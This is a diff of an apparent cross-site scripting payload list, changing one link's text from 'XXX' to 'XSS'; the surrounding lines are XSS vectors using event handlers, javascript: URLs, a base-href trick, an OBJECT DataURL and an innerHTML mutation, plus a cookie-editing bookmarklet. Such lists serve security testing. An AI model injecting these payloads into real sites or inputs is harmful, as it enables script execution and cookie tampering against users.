@@ -58,7 +58,7 @@ javascript:document.cookie=window.prompt("edit cookie:",document.cookie);void(0)
 <input value:aa/onclick=alert(/xss/)>
 <li style=list-style:url() onerror=alert(1)>
 <div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
-<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<head><base href="javascript://"></head><body><a href="/. /,alert(1)//#">XSS</a></body>
 <OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT>
 <div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
 
